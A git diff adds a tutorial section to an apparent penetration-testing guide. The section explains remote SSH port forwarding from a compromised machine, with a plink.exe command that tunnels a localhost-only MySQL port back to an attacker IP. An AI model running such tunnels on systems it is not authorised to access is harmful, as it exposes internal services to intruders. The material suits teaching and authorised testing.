@@ -98,6 +98,37 @@ ssh -L 8080:www.facebook.com:80 localhost
 
 ### Remote port forwarding
 
+Remote port forwarding is crazy, yet very simple concept. So imagine that you have compromised a machine, and that machine has like MYSQL running but it is only accessible for localhost. And you can't access it because you have a really crappy shell. So what we can do is just forward that port to our attacking machine. The steps are as following:
+
+Here is how you create a remote port forwarding
+```
+ssh <gateway> -R <remote port to bind>:<local host>:<local port>
+```
+
+
+
+By the way, plink is a ssh-client for windows that can be run from the terminal. The ip of the attacking machine is **111.111.111.111**.
+
+So on our compromised machine we do:
+
+```
+plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306
+```
+
+Now we can check netstat on our attacking machine, we should see something like this:
+
+```
+tcp        0      0 127.0.0.1:3307          0.0.0.0:*               LISTEN      19392/sshd: root@pt 
+```
+That means what we can connect to that port on the attacking machine from the attacking machine.
+
+Connect using the following command:
+
+```
+mysql -u root -p -h 127.0.0.1 --port=3307
+```
+
+
 ### Dynamic port forwarding
 
 This can be used to dynamically forward all traffic from a specific application. 
